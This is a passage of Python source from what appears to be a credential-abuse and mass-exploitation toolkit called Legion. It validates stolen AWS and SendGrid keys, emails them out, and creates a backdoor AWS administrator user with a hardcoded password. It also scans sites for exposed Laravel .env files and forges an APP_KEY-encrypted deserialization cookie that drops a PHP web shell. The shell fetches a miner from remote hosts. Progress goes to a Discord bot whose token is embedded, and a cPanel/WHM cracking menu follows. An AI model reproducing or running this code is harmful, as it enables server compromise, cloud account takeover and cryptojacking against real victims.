                        email_recipient = self.EMAIL_TEST
                        subject         = "LegionBot AWS SES SMTP (%s) " % from_sender
                        smtp_host       = "email-smtp.%s.amazonaws.com" % region
                        smtp_port       = 587
                        smtp_username   = aws_access
                        smtp_password   = calculate_key(aws_secret, region)


                        build_smtp = "====================[ $$ LegionBot AWS SES $$ ]====================\n"
                        build_smtp += "# AWS Access Key ID     : %s\n" % aws_access
                        build_smtp += "# AWS Secret Access Key : %s\n" % aws_secret
                        build_smtp += "# AWS Default Region    : %s\n" % region
                        build_smtp += "# Max 24 Hour Send      : %s\n" % max_send
                        build_smtp += "# Max Send Rate         : %s\n" % send_rate
                        build_smtp += "# Sent Last 24 Hours    : %s\n" % last_send
                        build_smtp += "# Host                  : email.%s.amazonaws.com\n" % region
                        build_smtp += "# Port                  : 587\n"
                        build_smtp += "# Username              : %s\n" % aws_access
                        build_smtp += "# Password              : %s\n" % calculate_key(aws_secret, region)
                        build_smtp += "# Send To               : %s\n" % email_recipient
                        for from_email in list_verified:
                            build_smtp += "# From Email            : %s\n" % from_email
                        build_smtp += "=========================================================================" + "\n"
                        append_smtp = self.join_string(build_smtp)

                        BODY_TEXT = append_smtp

                        BODY_HTML = "<html>\n"
                        BODY_HTML += "<head>\n"
                        BODY_HTML += "<body>\n"
                        BODY_HTML += "<pre>\n"
                        BODY_HTML += BODY_TEXT
                        BODY_HTML += "</pre>\n"
                        BODY_HTML += "</body>\n"
                        BODY_HTML += "</html>\n"
                        BODY_MESSAGE = self.join_string(BODY_HTML)

                        msg            = MIMEMultipart('alternative')
                        msg['Subject'] = subject
                        msg['From']    = email.utils.formataddr((from_name, from_sender))
                        msg['To']      = email_recipient

                        part1 = MIMEText(BODY_TEXT, 'plain')
                        part2 = MIMEText(BODY_MESSAGE, 'html')

                        msg.attach(part1)
                        msg.attach(part2)

                        try:
                            server = smtplib.SMTP(smtp_host, smtp_port)
                            server.ehlo()
                            server.starttls()
                            server.ehlo()
                            server.login(smtp_username, smtp_password)
                            server.sendmail(from_sender, email_recipient, msg.as_string())
                            server.close()

                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data="|".join([smtp_host, smtp_port, smtp_username, smtp_password, email_recipient]),
                                message="Send Success!",
                                status=True,
                                mode="AWS Checker"
                            )
                            self.write_file(smtp_ses_success, append_smtp)

                        except smtplib.SMTPResponseException as Error:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data="|".join([str(smtp_host), str(smtp_port), str(smtp_username), str(smtp_password), str(email_recipient)]),
                                message=Error.smtp_error,
                                status=False,
                                mode="AWS Checker"
                            )
                            self.write_file(smtp_ses_failed, append_smtp)

                    try:

                        iam = boto3.client('iam', aws_access_key_id=aws_access, aws_secret_access_key=aws_secret, region_name=region)

                        username = "LegionxAws"
                        password = "WeareLegion2022##"

                        create_user = iam.create_user(UserName=username)

                        get_username = create_user["User"]["UserName"]
                        get_arn      = create_user["User"]["Arn"]

                        create_password = client.create_login_profile(Password=password, PasswordResetRequired=False, UserName=username)

                        add_admin = client.attach_user_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess', UserName=username)

                        build_iam = "====================[ $$ LegionBot AWS IAM $$ ]====================\n"
                        build_iam += "# Console URL : https://console.aws.amazon.com/iam/home\n"
                        build_iam += "# Account ID  : %s\n" % get_arn
                        build_iam += "# Username    : %s\n" % get_username
                        build_iam += "# Password    : %s\n" % get_arn
                        build_iam += "=========================================================================\n"
                        append_iam = self.join_string(build_iam)
                        self.write_file(iam_live, append_iam)

                    except botocore.exceptions.ClientError as Error:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data="|".join([aws_access, aws_secret, aws_region]),
                            message=Error.response["Error"]["Message"],
                            status=False,
                            mode="AWS Checker"
                        )
                        build = "|".join([aws_access, aws_secret, region])
                        self.write_file(iam_dead, build)

                except botocore.exceptions.ClientError as Error:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data="|".join([aws_access, aws_secret, aws_region]),
                        message=Error.response["Error"]["Message"],
                        status=False,
                        mode="AWS Checker"
                    )
                    build = "|".join([aws_access, aws_secret, region])
                    self.write_file(ses_dead, build)

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))

    def ec_checker(self, counter, length, key):

        acc = self.safe_string(key)
        acc = acc.split("|")

        _access = acc[0]
        _secret = acc[1]
        _region = acc[2]

        #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        ec_live = self.set_result(filename="ec2_live.txt")
        ec_dead = self.set_result(filename="ec2_dead.txt")

        get_service_region = self.set_result(filename="get_service_region.txt")
        bad_result = self.set_result("ec2_bad_result.txt")

        try:

            print(f"{fc}[{gr}+{fc}] {red}================================================== {fc}[{gr}+{fc}]")
            print(f"{fc}[{gr}+{fc}]  Setup AWS Access Key ID : %s" % _access)
            subprocess.call("aws configure set aws_access_key_id %s" % _access, shell=True)
            subprocess.call("aws configure set aws_secret_access_key  %s" % _secret, shell=True)
            print(f"{fc}[{gr}+{fc}] Setup AWS Secret Access Key : %s" % _secret)
            subprocess.call("aws configure set default.region  %s" % _region, shell=True)
            print(f"{fc}[{gr}+{fc}] Setup AWS Region : %s" % _region)

            call = subprocess.check_output('aws service-quotas list-service-quotas --service-code ec2 --query "Quotas[*].{QuotaName:QuotaName,Value:Value}"', shell=True).decode()

            try:
                parse = json.loads(call)
                try:
                    if parse:
                        print(f"{fc}[{gr}+{fc}] {yl}AWS Access Key ID {res}: %s{fc}" % _access)
                        print(f"{fc}[{gr}+{fc}] {yl}AWS Secret Access Key {res}: %s{fc}" % _secret)
                        print(f"{fc}[{gr}+{fc}] {yl}AWS Region {res}: %s{fc}" % _region)
                        print(f"{fc}[{gr}+{fc}] {gr}AWS Service {res}:{gr} ")

                        build_ec = "AWS_ACCESS_KEY_ID : %s\n" % _access
                        build_ec += "AWS_SECRET_ACCESS_KEY : %s\n" % _secret
                        build_ec += "AWS_DEFAULT_REGION : %s\n" % _region
                        build_ec += "AWS_SERVICE : "

                        join_ec = self.join_string(build_ec)
                        self.write_file(get_service_region, join_ec)
                        region = ["us-east-1", "us-east-2", "us-west-1", "us-west-2", "af-south-1", "ap-east-1", "ap-south-1", "ap-northeast-1", "ap-northeast-2", "ap-northeast-3", "ap-southeast-1", "ap-southeast-2", "ca-central-1", "eu-central-1", "eu-west-1", "eu-west-2", "eu-west-3", "eu-south-1", "eu-north-1", "me-south-1", "sa-east-1"]
                        for reg in region:
                            print(f"{fc}\n Region :{res} %s" % reg)
                            query = 'aws service-quotas list-service-quotas --service-code ec2 --region '+reg+' --query \"Quotas[*].{QuotaName:QuotaName,Value:Value}\" --output table'
                            try:
                                result = subprocess.check_output(query,shell=True).decode()
                                print(f"{fc}{result}")
                            except:
                                result = "This Account Not Subscribed in %s Region" % reg
                                print(f"{red}{result}")

                            details = "Region : %s \n\n %s " % (reg, result)
                            self.write_file(get_service_region, details)

                        print(f"{red}[{fc}+{red}] ================================================== {red}[{fc}+{red}]")
                        self.write_file(ec_live, key)

                    else:
                        print(f"{red}[{fc}+{red}] {yl}AWS Access Key ID {res}: %s{fc}" % _access)
                        print(f"{red}[{fc}+{red}] {yl}AWS Secret Access Key {res}: %s{fc}" % _secret)
                        print(f"{red}[{fc}+{red}] {yl}AWS Region {res}: %s{fc}" % _region)
                        print(f"{red}[{fc}+{red}] {gr}AWS Status {res}: {red}Dead")

                        build_ec = "AWS_ACCESS_KEY_ID : %s\n" % _access
                        build_ec += "AWS_SECRET_ACCESS_KEY : %s\n" % _secret
                        build_ec += "AWS_DEFAULT_REGION : %s\n" % _region

                        join_ec = self.join_string(build_ec)
                        self.write_file(bad_result, join_ec)
                        self.write_file(ec_dead, key)

                except Exception as e:
                    print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                    pass

            except Exception:
                pass

        except:

            print(f"{red}[{fc}+{red}] {yl}AWS Access Key ID {res}: {fc}%s" % _access)
            print(f"{red}[{fc}+{red}] {yl}AWS Secret Access Key {res}: %s{fc}" % _secret)
            print(f"{red}[{fc}+{red}] {yl}AWS Region {res}: %s{fc}" % _region)
            print(f"{red}[{fc}+{red}] {gr}AWS Status {res}: {red}Dead")

            build_ec = "AWS_ACCESS_KEY_ID : %s\n" % _access
            build_ec += "AWS_SECRET_ACCESS_KEY : %s\n" % _secret
            build_ec += "AWS_DEFAULT_REGION : %s\n" % _region

            join_ec = self.join_string(build_ec)
            self.write_file(bad_result, join_ec)
            #self.write_file(ec_dead, key)


    def sendgrid_checker(self, counter, length, api_key):
        try:
            sendgrid_live = self.set_result("sendgrid_live.txt")
            sendgrid_dead = self.set_result("sendgrid_dead.txt")

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:

                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                    "Authorization": "Bearer " + api_key
                }

                #sg = SendGridAPIClient(api_key)


                req_info = requests.get('https://api.sendgrid.com/v3/user/credits', headers=headers)
                req_user = requests.get('https://api.sendgrid.com/v3/user/email',headers=headers)

                get_used = json.loads(req_info.text)["used"]
                get_limit = json.loads(req_info.text)["total"]
                get_from = json.loads(req_user.text)["email"]


                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=api_key,
                    message=["|".join([str(get_limit), str(get_used), str(get_from)])],
                    status=True,
                    mode="Sendgrid Checker"
                )

                build_sendgrid  = "SMTP Host     : smtp.sendgrid.net\n"
                build_sendgrid += "SMTP Port     : 587\n"
                build_sendgrid += "SMTP Username : apikey\n"
                build_sendgrid += "SMTP Password : %s\n" % api_key
                build_sendgrid += "SMTP From     : %s\n" % get_from
                append_sendgrid = self.join_string(build_sendgrid)

                self.write_file(sendgrid_live, append_sendgrid)


            except:
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=api_key,
                    message="Dead",
                    status=False,
                    mode="Sendgrid Checker"
                )
                self.write_file(sendgrid_dead, api_key)

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    def run_bot(self, bot_mode, input_list, num_threads):
        try:
            load_list    = self.get_file(input_list)
            list_value   = load_list["list"]
            list_length  = load_list["length"]
            list_counter = 0
            self.show_info_message(message="Starting %s Jobs with %s Workers" % (list_length, num_threads))
            pool = ThreadPool(int(num_threads))
            for data in list_value:
                list_counter = list_counter + 1
                try:
                    iterable = (str(list_counter), str(list_length), str(data))
                    pool.add_task(self.map_helper, bot_mode, iterable)
                except (SystemExit, KeyboardInterrupt):
                    self.show_error_message("Task Cancelled")
            pool.wait_completion()
        except KeyboardInterrupt:
            self.show_error_message("Caught Keyboard Interrupt, Terminating Workers")
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
#RCE zone
def RceMenu():
    print(f'''
{red}------- \033[32mLegion RCE EXPLOIT Menu{red} -------
{fc}───┬───────────────
   {fc}└╼ {red}[{gr}1{red}] {cy}RCE {fc}[{red}EXPLOIT{fc}] {gr}ACTIVE  {fc}Grab From APPKEY List{res} {gr}[NEW]
   {fc}└╼ {red}[{gr}2{red}] {cy}RCE {fc}[{red}EXPLOIT{fc}] {gr}ACTIVE  {fc}Grab From Site List{res} {gr}[NEW]
   {fc}└╼ {red}[{gr}3{red}] {cy}RCE {fc}[{red}EXPLOIT{fc}] {gr}ACTIVE  {fc}Grab From Site List{res} {gr}+ {yl}DISCORD TRACKER {gr}[NEW]
{fc}───┬───────────────
   {fc}└╼ {red}[{gr}0{red}] {gr}BACK TO MAIN MENU

''')
def RCEBot():
    RceMenu()
    while True:
        print(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your Choice{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
        choice = input('')
        if choice == "1":
            try:
            	os.mkdir('RCE')
            except:
            	pass
            default_name = 'Legion.php'
            pathname = default_name

            def payload(key, p):
            	keys = key.encode()
            	wkwk = base64.b64decode(key)
            	payload_decoded = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(p)) + ':"' + p + '";}}}}'

            	value = base64.b64encode(payload_decoded.encode()).decode('utf-8')
            	keyss = base64.b64decode(key)
            	return encrypt(value, keyss)

            def encrypt(text, key, key_size=256):
            	from Crypto.Random import get_random_bytes
            	ivv = get_random_bytes(16)
            	cipher = AES.new(key, AES.MODE_CBC, ivv)
            	value = cipher.encrypt(pad(base64.b64decode(text), 16))
            	payload = base64.b64encode(value)
            	iv_base64 = base64.b64encode(ivv)
            	hashed_mac = hmac.new(key, iv_base64 + payload, sha256).hexdigest()
            	iv_base64 = iv_base64.decode('utf-8')
            	payload = payload.decode('utf-8')
            	data = { 'iv': iv_base64, 'value': payload, 'mac': hashed_mac}
            	json_data = json.dumps(data)
            	payload_encoded = base64.b64encode(json_data.encode()).decode('utf-8')
            	return payload_encoded

            def get_env(text, url):
            	if "APP_KEY" in text:
            		if "APP_KEY=" in text:
            			appkey = re.findall("APP_KEY=([a-zA-Z0-9:;\/\\=$%^&*()-+_!@#]+)", text)[0]
            		else:
            			if "<td>APP_KEY</td>" in text:
            				appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
            		if appkey:
            			if '"' in appkey or "'" in appkey:
            				appkey = appkey[1:-1]
            			return appkey
            		else:
            			return False
            	else:
            		return False

            def exploit(url, app_key, path_name=default_name):
            	global pathname
            	pathname = path_name

            	p = '<?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/'+pathname+'", "w") or die("Unable to open file!"); $code = "PD9waHAgZWNobyAnPGNlbnRlcj48aDE+TEVHSU9OIEVYUExPSVQgVjQgKE7Eg3ZvZGFyaSBQb3dlcik8L2gxPicuJzxicj4nLidbdW5hbWVdICcucGhwX3VuYW1lKCkuJyBbL3VuYW1lXSAnO2VjaG8nPGZvcm0gbWV0aG9kPSJwb3N0ImVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPic7ZWNobyc8aW5wdXQgdHlwZT0iZmlsZSJuYW1lPSJmaWxlIj48aW5wdXQgbmFtZT0iX3VwbCJ0eXBlPSJzdWJtaXQidmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7aWYoICRfUE9TVFsnX3VwbCddPT0iVXBsb2FkIil7aWYoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7ZWNobyc8Yj5MRUdJT04gRXhwbG9pdCBTdWNjZXNzITwvYj4nO31lbHNle2VjaG8nPGI+TEVHSU9OIEV4cGxvaXQgU3VjY2VzcyE8L2I+Jzt9fSBzeXN0ZW0oJ2N1cmwgLXMgLWsgMi41Ny4xMjIuMTEyL3JjZS9sb2FkIC1vIGFkaW5kZXgucGhwOyBjZCAvdG1wOyBjdXJsIC1PIDkxLjIxMC4xNjguODAvbWluZXIuanBnOyB0YXIgeHp2ZiBtaW5lci5qcGcgPiAvZGV2L251bGw7IHJtIC1yZiBtaW5lci5qcGc7IGNkIC54OyAuL3ggPiAvZGV2L251bGwnKTsKPz4="; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("LEGION EXPLOIT V3"); ?>'

            	try:
            		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
            		generate_payload = payload(app_key, p)
            		cokk = {"XSRF-TOKEN": generate_payload}
            		curler = requests.get(url+'/public', cookies=cokk, verify=False, timeout=8, headers=headers).text
            		if "LEGION EXPLOIT V3" not in curler:
            			curler = requests.get(url+'/', cookies=cokk, verify=False, timeout=8, headers=headers).text
            		if "LEGION EXPLOIT" in curler:
            			status_exploit = "Successfully"
            		else:
            			status_exploit = "Can't exploit"
            	except Exception as err:
            		status_exploit = 'ERROR: ' + str(err)
            	make_print = url + '/' + pathname + ' => ' + status_exploit
            	return status_exploit
            try:
            	open_list = open(input('\033[31;1m┌─\033[31;1m[\033[36;1mRCE UPLOADER\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')).read()
            except:
            	exit('RCE bot exit!')

            for parlist in open_list.splitlines():
            	parse_data = parlist.split('|')
            	get_status_exploit = exploit(parse_data[0], parse_data[1], path_name=default_name)
            	if get_status_exploit == "Successfully":
            		print('\033[32;1m#\033[36;1m[\033[32;1mVULN\033[36;1m] \033[36;1m ─╼ \033[0;1m'+parse_data[0] + '/' + pathname + '\033[35m ─╼ \033[32mSHELL SPAWNED\033[0m')
            		open('RCE/shell.txt', 'a').write(parse_data[0] + '/' + pathname + '\n')
            	elif get_status_exploit == "Can't exploit":
            		print('\033[31;1m#\033[33;1m[\033[31;1mNOT VULN\033[33;1m] \033[36;1m ─╼ \033[0;1m'+parse_data[0] + ' \033[33m─╼ \033[31mCan\'t exploit\033[0m')
            		open('RCE/cant.txt', 'a').write(parse_data[0] + '\n')
            	else:
            		print('\033[31;1m#\033[33;1m[\033[31;1mERROR\033[33;1m] \033[36;1m ─╼ \033[0;1m'+parse_data[0] + ' \033[33m─╼ \033[31m─╼' + get_status_exploit)
            		open('RCE/error.txt', 'a').write(parse_data[0] + ' => ' + get_status_exploit + '\n')
        elif choice == "2":
            try:
            	os.mkdir('RCE')
            except:
            	pass
            # exploit
            default_name = 'inc20k1.php'
            pathname = default_name

            # read list
            list_isi = open(input(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}RCE {yl}LIST{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')).read().split('\n')
            total_list = len(list_isi)
            now_run = 0

            # report
            dot_env = 0
            vuln = 0
            not_vuln = 0


            def payload(key, p):
            	keys = key.encode()
            	wkwk = base64.b64decode(key)
            	payload_decoded = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(p)) + ':"' + p + '";}}}}'

            	value = base64.b64encode(payload_decoded.encode()).decode('utf-8')
            	keyss = base64.b64decode(key)
            	return encrypt(value, keyss)

            def encrypt(text, key, key_size=256):
            	from Crypto.Random import get_random_bytes
            	ivv = get_random_bytes(16)
            	cipher = AES.new(key, AES.MODE_CBC, ivv)
            	value = cipher.encrypt(pad(base64.b64decode(text), 16))
            	payload = base64.b64encode(value)
            	iv_base64 = base64.b64encode(ivv)
            	hashed_mac = hmac.new(key, iv_base64 + payload, sha256).hexdigest()
            	iv_base64 = iv_base64.decode('utf-8')
            	payload = payload.decode('utf-8')
            	data = { 'iv': iv_base64, 'value': payload, 'mac': hashed_mac}
            	json_data = json.dumps(data)
            	payload_encoded = base64.b64encode(json_data.encode()).decode('utf-8')
            	return payload_encoded

            def get_env(text, url):
            	if "APP_KEY" in text:
            		if "APP_KEY=" in text:
            			appkey = re.findall("APP_KEY=([a-zA-Z0-9:;\/\\=$%^&*()-+_!@#]+)", text)[0]
            		else:
            			if "<td>APP_KEY</td>" in text:
            				appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
            		if appkey:
            			if '"' in appkey or "'" in appkey:
            				appkey = appkey[1:-1]
            			appkey_final = appkey.replace('base64:','')
            			return appkey_final
            		else:
            			return False
            	else:
            		return False

            def exploit(url, app_key, path_name=default_name):
            	global pathname
            	pathname = path_name

            	p = '<?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/'+pathname+'", "w") or die("Unable to open file!"); $code = "PD9waHAgZWNobyAnPGNlbnRlcj48aDE+TEVHSU9OIEVYUExPSVQgVjQgKE7Eg3ZvZGFyaSBQb3dlcik8L2gxPicuJzxicj4nLidbdW5hbWVdICcucGhwX3VuYW1lKCkuJyBbL3VuYW1lXSAnO2VjaG8nPGZvcm0gbWV0aG9kPSJwb3N0ImVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPic7ZWNobyc8aW5wdXQgdHlwZT0iZmlsZSJuYW1lPSJmaWxlIj48aW5wdXQgbmFtZT0iX3VwbCJ0eXBlPSJzdWJtaXQidmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7aWYoICRfUE9TVFsnX3VwbCddPT0iVXBsb2FkIil7aWYoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7ZWNobyc8Yj5MRUdJT04gRXhwbG9pdCBTdWNjZXNzITwvYj4nO31lbHNle2VjaG8nPGI+TEVHSU9OIEV4cGxvaXQgU3VjY2VzcyE8L2I+Jzt9fSBzeXN0ZW0oJ2N1cmwgLXMgLWsgMi41Ny4xMjIuMTEyL3JjZS9sb2FkIC1vIGFkaW5kZXgucGhwOyBjZCAvdG1wOyBjdXJsIC1PIDkxLjIxMC4xNjguODAvbWluZXIuanBnOyB0YXIgeHp2ZiBtaW5lci5qcGcgPiAvZGV2L251bGw7IHJtIC1yZiBtaW5lci5qcGc7IGNkIC54OyAuL3ggPiAvZGV2L251bGwnKTsKPz4="; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("LEGION EXPLOIT V3"); '

            	try:
            		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
            		generate_payload = payload(app_key, p)
            		cokk = {"XSRF-TOKEN": generate_payload}
            		curler = requests.get(url+'/public', cookies=cokk, verify=False, timeout=8, headers=headers).text
            		if "LEGION EXPLOIT V3" not in curler:
            			curler = requests.get(url+'/', cookies=cokk, verify=False, timeout=8, headers=headers).text
            		if "LEGION" in curler:
            			status_exploit = "Successfully"
            		else:
            			status_exploit = "Can't exploit"
            	except Exception as err:
            		status_exploit = 'ERROR: ' + str(err)
            	make_print = url + '/' + pathname + ' => ' + status_exploit
            	return status_exploit

            def ngecurl_(isi):
            	time.sleep(3)
            	return isi

            async def edit_msg(lol, isi):
            	await lol.edit(content=isi)
            	return True

            @client.event
            async def on_ready():
            	global now_run, vuln, not_vuln, dot_env
            	first_send = await client.get_channel(854344592350904370).send("**LARAVEL RCE BOT IS ONLINE WITH** " + str(total_list) + " URL LIST \n\n-MY LEGION EXPLOIT\n")

            	time.sleep(5)
            	for isi in list_isi:
            		if isi == '':
            			continue
            		now_run = now_run + 1
            		make_str_msg = '**LEGION BOT** IS *FUCKING RCE* :)\n[' + str(now_run) + '/' + str(total_list) + '] <' + isi + '>'
            		await edit_msg(first_send, make_str_msg)
            		if '|' in isi:
            			parse_data = parlist.split('|')
            			get_status_exploit = exploit(parse_data[0], parse_data[1], path_name=default_name)
            			if get_status_exploit == "Successfully":
            				print(parse_data[0] + '/' + pathname + ' => \033[32mSuccessfully\033[0m')
            				await edit_msg(make_str_msg + "vuln")
            				open('RCE/shell.txt', 'a').write(parse_data[0] + '/' + pathname + '\n')
            			elif get_status_exploit == "Can't exploit":
            				print(parse_data[0] + ' => \033[31mCan\'t exploit\033[0m')
            				open('RCE/cant.txt', 'a').write(parse_data[0] + '\n')
            			else:
            				print(parse_data[0] + ' => ' + get_status_exploit)
            				open('RCE/error.txt', 'a').write(parse_data[0] + ' => ' + get_status_exploit + '\n')
            		else:
            			if '://' not in isi:
            				url = 'http://' + isi
            			else:
            				url = isi
            			if url.endswith('/'):
            				url = url[:-1]

            			#print('Testing: ' + url )
            			try:
            				headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
            				send_invalid_data = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
            				if "APP_KEY=" in send_invalid_data:
            					get_appkey = get_env(send_invalid_data, url)
            				else:
            					send_invalid_data = requests.post(url + '/', data={'Mylegion[]':'Exploit'}, headers=headers, timeout=5).text
            					get_appkey = get_env(send_invalid_data, url)
            				if get_appkey:
            					dot_env = dot_env + 1
            					get_status_exploit = exploit(url, get_appkey, path_name=default_name)
            					if get_status_exploit == "Successfully":
            						vuln = vuln + 1
            						print(url + '/' + pathname + ' => \033[32mSuccessfully\033[0m')
            						open('shell.txt', 'a').write(url + '/' + pathname + '\n')
            					elif get_status_exploit == "Can't exploit":
            						print(url + ' => \033[31mCan\'t exploit\033[0m')
            						open('cant.txt', 'a').write(url + '\n')
            					else:
            						print(url + ' => ' + get_status_exploit)
            						open('error.txt', 'a').write(url + ' => ' + get_status_exploit + '\n')
            				else:
            					not_vuln = not_vuln + 1
            					print(url + ' => \033[31mCan\'t get appkey\033[0m')
            			except Exception as err:
            				print(url + ' => \033[31;1mException\033[0m')
            				not_vuln = not_vuln + 1

            	final_msg = 'MY LEGION | LARAVEL RCE BOT REPORT\n\nDOT ENV: ' + str(dot_env) + '\nVULNERABLE: ' + str(vuln) + '\nNOT VULNERABLE: ' + str(not_vuln) + '\n\n-My Legion Exploit'
            	await edit_msg(first_send, final_msg)
            	await client.close()
            @client.command(aliases=["s"])
            async def status(ctx):
                global now_run, vuln, not_vuln, dot_env
                now_run = now_run + 1
                oembed = discord.Embed(title=f"RCE STATUS\n\nSITES PROCESSED {str(now_run)}\nDOT ENV VULN  {str(dot_env)}\nSHELL UPLOADED  {str(vuln)}\nSITES NOT VULN  {str(not_vuln)}", color=discord.Color.green())

                await ctx.send(embed=oembed)


            client.run("NjkwNjU4NTA1OTMzMzI0MzI5.XnUn2w.QGjSopuNlnW1dzUUSBUmDVuzago")
        elif choice == "0":
            printez()
            alege()

#CP WHM zone
def CPMenu():
    print(f'''
{red}------- \033[32mLegion CPANEL/WHM EXPLOIT Menu{red} -------
{fc}───┬───────────────
   {fc}└╼ {red}[{gr}1{red}] CRACK CPANELS {red}[{fc}FROM DATABASE LIST{red}] {gr}ACTIVE {red}[{gr}NEW{red}]
   {fc}└╼ {red}[{gr}2{red}] CRACK WHM {red}[{fc}FROM DATABASE LIST{red}] {gr}ACTIVE {red}[{gr}NEW{red}]
{fc}───┬───────────────
   {fc}└╼ {red}[{gr}0{red}] {gr}BACK TO MAIN MENU
''')
def CPBot():
    CPMenu()
    while True:
        print(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}Choice{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
        choice = input('')
        if choice == "1":
            try:
                list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION WP \033[32;1m+ \033[31;1mBonjour\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
                lists = open(list, 'r').read().split('\n')

                print('''
                    1.MultiProcessing
                    2.ThreadPool
                ''')
                chosethrd = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Choice\033[31;1m]\n└─╼\033[32;1m#')
                if chosethrd == '1':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian, lists)
                if chosethrd == '2':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(bagian, listss)
            except:
                print('{}Wrong'.format(fr))
        if choice == "2":
            try:
